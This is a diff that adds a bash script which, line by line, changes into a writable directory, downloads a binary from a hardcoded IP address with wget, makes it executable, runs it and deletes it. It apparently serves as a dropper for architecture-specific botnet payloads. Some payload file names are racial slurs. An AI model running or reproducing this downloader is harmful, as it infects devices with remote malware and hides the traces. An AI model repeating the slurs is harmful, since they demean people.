@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.128.79.87/xboxmips; chmod +x xboxmips; ./xboxmips; rm -rf xboxmips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.128.79.87/haxmipsel; chmod +x haxmipsel; ./haxmipsel; rm -rf haxmipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.128.79.87/closedssh; chmod +x closedssh; ./closedssh; rm -rf closedssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.128.79.87/fuckbash; chmod +x fuckbash; ./fuckbash; rm -rf fuckbash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.128.79.87/riptftp; chmod +x riptftp; ./riptftp; rm -rf riptftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.128.79.87/wgetmydong; chmod +x wgetmydong; ./wgetmydong; rm -rf wgetmydong
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.128.79.87/tron; chmod +x tron; ./tron; rm -rf tron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.128.79.87/fttp; chmod +x fttp; ./fttp; rm -rf fttp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.128.79.87/pftpxbox; chmod +x pftpxbox; ./pftpxbox; rm -rf pftpxbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.128.79.87/sh; chmod +x sh; ./sh; rm -rf sh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.128.79.87/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.128.79.87/nigger; chmod +x nigger; ./nigger; rm -rf nigger
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.128.79.87/nibba; chmod +x nibba; ./nibba; rm -rf nibba
